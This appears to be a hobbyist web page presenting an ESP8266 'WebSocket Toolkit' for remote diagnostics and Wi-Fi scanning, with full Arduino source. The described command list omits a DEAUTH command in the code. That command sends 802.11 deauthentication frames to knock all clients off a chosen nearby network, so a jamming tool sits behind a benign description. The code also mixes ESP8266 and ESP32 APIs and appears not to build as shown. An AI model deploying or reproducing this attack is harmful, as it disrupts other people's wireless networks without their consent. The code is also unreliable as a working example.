---
layout: page
title: ESP8266 - Networking
published: 2026-09-27
description: "WebSocket - Toolkit"
permalink: /arduino/esp8266/websocket_toolkit
category: esp8266
subcategory: wifi
---
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' https:; script-src 'self'; style-src 'self' 'unsafe-inline';">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
<meta name="referrer" content="no-referrer">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
<meta http-equiv="X-XSS-Protection" content="1; mode=block">
<meta http-equiv="Access-Control-Allow-Origin" content="*">
<meta http-equiv="Cross-Origin-Embedder-Policy" content="require-corp">
<meta http-equiv="Cross-Origin-Opener-Policy" content="same-origin">
<meta http-equiv="Cross-Origin-Resource-Policy" content="same-origin">
<meta http-equiv="Expect-CT" content="max-age=86400, enforce">

<link rel="icon" href="/favicon.png" type="image/png">
<link rel="stylesheet" href="{{ 'css/main.css' | relative_url }}">
<script src="{{ 'assets/js/copy-to-clipboard.js' | relative_url }}"></script>

---

<h1>ESP8266 WebSocket Toolkit</h1>

- Phantom

<p>
This project is an ESP8266-based networking toolkit that combines a remote WebSocket client with a local WebSocket server for device management. It provides remote diagnostics, Wi-Fi network discovery, persistent SPIFFS storage, and real-time communication with both a central management server and locally connected clients.
</p>

<h1>Features</h1>

<ul>
    <li>Remote WebSocket client for communicating with a central server.</li>
    <li>Local WebSocket server for browser or application control.</li>
    <li>Automatic Wi-Fi connection and reconnection.</li>
    <li>Wi-Fi network discovery with SSID, BSSID, and signal strength reporting.</li>
    <li>Persistent storage of discovered networks using SPIFFS.</li>
    <li>Remote device diagnostics and status reporting.</li>
</ul>

<h1>Supported Commands</h1>

<ul>
    <li><code class="language-bash">PING</code> — Tests connectivity with the device.</li>
    <li><code class="language-bash">UPTIME</code> — Displays the current device uptime.</li>
    <li><code class="language-bash">FREE_MEM</code> — Reports available heap memory.</li>
    <li><code class="language-bash">SCAN_WIFI</code> — Scans for nearby wireless networks and stores new results.</li>
    <li><code class="language-bash">LOAD_WIFI</code> — Loads previously saved Wi-Fi scan results from SPIFFS.</li>
</ul>

<h1>Reusable Components</h1>

<p>
This project includes several reusable modules suitable for other ESP8266 projects, including a WebSocket client, embedded WebSocket server, Wi-Fi scanning routines, SPIFFS file management, JSON serialization, automatic reconnect logic, and a command-based control interface that can easily be extended with additional functionality.
</p>

<h1>Future Improvements</h1>

<p>
Future revisions could introduce a modular command dispatcher, encrypted WebSocket communication, authenticated remote administration, asynchronous networking, improved filesystem organization, and support for over-the-air firmware updates. These additions would make the toolkit easier to extend while improving reliability and maintainability.
</p>

```bash
#include <ESP8266WiFiAP.h>
#include <WiFiClientSecure.h>
#include <WiFiServer.h>
#include <ESP8266WiFiMulti.h>
#include <WiFiServerSecure.h>
#include <WiFiClientSecureBearSSL.h>
#include <ESP8266WiFiGratuitous.h>
#include <ESP8266WiFiSTA.h>
#include <WiFiUdp.h>
#include <BearSSLHelpers.h>
#include <ESP8266WiFiType.h>
#include <WiFiServerSecureBearSSL.h>
#include <ArduinoWiFiServer.h>
#include <ESP8266WiFiGeneric.h>
#include <ESP8266WiFi.h>
#include <ESP8266WiFiScan.h>
#include <CertStoreBearSSL.h>
#include <WiFiClient.h>

//#include <WiFi.h>
#include <WebSocketsClient.h>
#include <WebSocketsServer.h>
#include <FS.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include "esp_wifi.h"

// Wi-Fi and WebSocket client settings
const char* deviceHostName = "DirectSec_ESP32_ToolKit";  // 🔹 Set a static hostname here  
const char* ssid = "TL;DR";  // 🔹 Replace with your Wi-Fi SSID
const char* password = "*********";       // 🔹 Replace with your Wi-Fi password 
const char* serverAddress = "192.168.6.66";   // 🔹 Your PC's IP
const int serverPort = 8000; // 🔹 Set PORT   [UPDATE SubrosaWare.py to match desired PORT]
const char* deviceID = "ESP32_1";  // 🔹 Set DeviceID   [UPDATE SubrosaWare.py to match desired DeviceID]

WebSocketsClient webSocketClient; // WebSocket client to communicate with PC
WebSocketsServer webSocketServer(81);  // WebSocket server for local communication

struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
};

std::vector<WiFiNetwork> networks;  // Store Wi-Fi network information

// Function to save Wi-Fi data to SPIFFS
void saveWiFiData(String wifiData) {
    // String existingData = loadWiFiData();
    String existingData = readWiFiData();  // Use the correct function name
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, existingData);

    JsonArray networksArray = doc.as<JsonArray>();

    DynamicJsonDocument newDoc(1024);
    deserializeJson(newDoc, wifiData);
    JsonArray newNetworks = newDoc.as<JsonArray>();

    for (JsonObject network : newNetworks) {
        String ssid = network["SSID"].as<String>();
        String signal = network["Signal"].as<String>();

        bool exists = false;
        for (JsonObject savedNetwork : networksArray) {
            if (savedNetwork["SSID"].as<String>() == ssid) {
                exists = true;
                break;
            }
        }

        if (!exists) {
            networksArray.add(network);
        }
    }

    File file = SPIFFS.open("/wifi_data.json", "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
        Serial.println("[+] Wi-Fi data saved!");
    }
}


String readWiFiData() {
    if (!SPIFFS.begin(true)) {
        Serial.println("[!] Failed to mount SPIFFS.");
        return "";
    }

    File file = SPIFFS.open("/wifi_data.json", "r");
    if (!file) {
        Serial.println("[!] Failed to open Wi-Fi data file.");
        return "";
    }

    String jsonData = file.readString();
    file.close();

    return jsonData;
}

void loadWiFi() {
    String jsonData = readWiFiData();  // Read stored Wi-Fi data from SPIFFS

    if (jsonData.length() > 0) {
        DynamicJsonDocument wifiDoc(2048);
        DeserializationError error = deserializeJson(wifiDoc, jsonData);

        if (!error) {
            JsonArray wifiArray = wifiDoc.as<JsonArray>();
            String wifiData = "Stored Wi-Fi Networks:\n";

            for (JsonObject network : wifiArray) {
                wifiData += "  " + network["SSID"].as<String>() + 
                            " [" + network["BSSID"].as<String>() + "]" +
                            " (Signal: " + network["Signal"].as<String>() + " dBm)\n";
            }

            webSocketClient.sendTXT(wifiData);
        } else {
            Serial.println("[!] Failed to parse stored Wi-Fi data.");
        }
    } else {
        webSocketClient.sendTXT("No Wi-Fi data stored.");
    }
}


// Scan available Wi-Fi networks and save the result
void scanWiFi() {
    Serial.println("[*] Scanning Wi-Fi...");
    int networksFound = WiFi.scanNetworks();
    DynamicJsonDocument wifiDoc(2048);  // Increase size for additional data
    JsonArray wifiArray = wifiDoc.to<JsonArray>();

    for (int i = 0; i < networksFound; i++) {
        JsonObject network = wifiArray.createNestedObject();
        network["SSID"] = WiFi.SSID(i);
        network["BSSID"] = WiFi.BSSIDstr(i);  // Get the MAC address (BSSID)
        network["Signal"] = String(WiFi.RSSI(i));

        // Print results in the serial monitor for debugging
        Serial.println("  " + String(i + 1) + ". " + WiFi.SSID(i) + " [" + WiFi.BSSIDstr(i) + "] (Signal: " + String(WiFi.RSSI(i)) + " dBm)");
    }

    // Save the scanned Wi-Fi networks
    String jsonData;
    serializeJson(wifiDoc, jsonData);
    saveWiFiData(jsonData);

    // Send the formatted result over WebSocket
    String wifiData = "Wi-Fi Networks Found:\n";
    for (int i = 0; i < wifiArray.size(); i++) {
        JsonObject network = wifiArray[i];
        wifiData += "  " + String(i + 1) + ". " + network["SSID"].as<String>() + 
                    " [" + network["BSSID"].as<String>() + "]" +
                    " (Signal: " + network["Signal"].as<String>() + " dBm)\n";
    }
    webSocketClient.sendTXT(wifiData);
}

// Function to scan Wi-Fi networks for the WebSocket server
void scanWiFiNetworks() {
    networks.clear();
    int numNetworks = WiFi.scanNetworks();
    for (int i = 0; i < numNetworks; i++) {
        WiFiNetwork net;
        net.ssid = WiFi.SSID(i);
        memcpy(net.bssid, WiFi.BSSID(i), 6);
        networks.push_back(net);
    }
}

// Function to send the list of Wi-Fi networks to clients connected to the WebSocket server
void sendWiFiList() {
    String wifiList = "";
    for (size_t i = 0; i < networks.size(); i++) {
        wifiList += String(i + 1) + ". " + networks[i].ssid + "\n";
    }
    webSocketServer.broadcastTXT(wifiList);
}

// Function to send a deauth packet (for a Wi-Fi deauth attack)
void sendDeauthPacket(const uint8_t *targetMac, const uint8_t *bssid) {
    uint8_t deauthPacket[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
        0x00, 0x00, 0x07, 0x00
    };
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    Serial.println("[+] Deauth Packet Sent");
}

// WebSocket event handling for the server
void webSocketServerEvent(uint8_t num, WStype_t type, uint8_t *payload, size_t length) {
    String command = String((char*)payload);
    if (command == "SCAN_WIFI") {
        scanWiFiNetworks();
        sendWiFiList();
    } else if (command.startsWith("DEAUTH")) {
        int targetIndex = command.substring(7).toInt() - 1;
        if (targetIndex >= 0 && targetIndex < networks.size()) {
            uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthPacket(broadcastMac, networks[targetIndex].bssid);
            webSocketServer.sendTXT(num, "[+] Deauth Attack on " + networks[targetIndex].ssid);
        } else {
            webSocketServer.sendTXT(num, "[-] Invalid selection");
        }
    }
}

// WebSocket event handling for the client
void webSocketClientEvent(WStype_t type, uint8_t *payload, size_t length) {
    String command = String((char*)payload);
    Serial.println("Received: " + command);

    if (command == "PING") {
        webSocketClient.sendTXT("PONG");
    } else if (command == "UPTIME") {
        webSocketClient.sendTXT("Uptime: " + String(millis() / 1000) + " seconds");
    } else if (command == "FREE_MEM") {
        webSocketClient.sendTXT("Free Heap: " + String(ESP.getFreeHeap()) + " bytes");
    } else if (command == "SCAN_WIFI") {
        scanWiFi();
    } else if (command == "LOAD_WIFI") {
        loadWiFi();  // Load saved Wi-Fi data in formatted string
    } else {
        webSocketClient.sendTXT("[ERROR] Unknown Command: " + command);
    }
}

// Wi-Fi connection setup
void connectWiFi() {
    Serial.print("[*] Connecting to WiFi...");
    WiFi.begin(ssid, password);
    
    int attempt = 0;
    while (WiFi.status() != WL_CONNECTED && attempt < 20) {
        delay(500);
        Serial.print(".");
        attempt++;
    }

    if (WiFi.status() == WL_CONNECTED) {
        Serial.println("\n[+] WiFi Connected! IP: " + WiFi.localIP().toString());
    } else {
        Serial.println("\n[-] WiFi connection failed. Restarting...");
        ESP.restart();
    }
}

// Connect to the WebSocket server on the PC
void connectWebSocketClient() {
    Serial.println("[*] Connecting to WebSocket...");
    webSocketClient.begin(serverAddress, serverPort, (String("/ws/") + deviceID).c_str());
    webSocketClient.onEvent(webSocketClientEvent);
    webSocketClient.setReconnectInterval(5000);
}

// Set up WebSocket server for local communication
void setupWebSocketServer() {
    webSocketServer.begin();
    webSocketServer.onEvent(webSocketServerEvent);
}

void setup() {
    Serial.begin(115200);
    SPIFFS.begin(true);
    connectWiFi();
    connectWebSocketClient();
    setupWebSocketServer();
    WiFi.setHostname(deviceHostName);
}

void loop() {
    webSocketClient.loop();
    webSocketServer.loop();
    delay(10);
}
```

---

<style>
  footer {
    display: none;
  }
</style>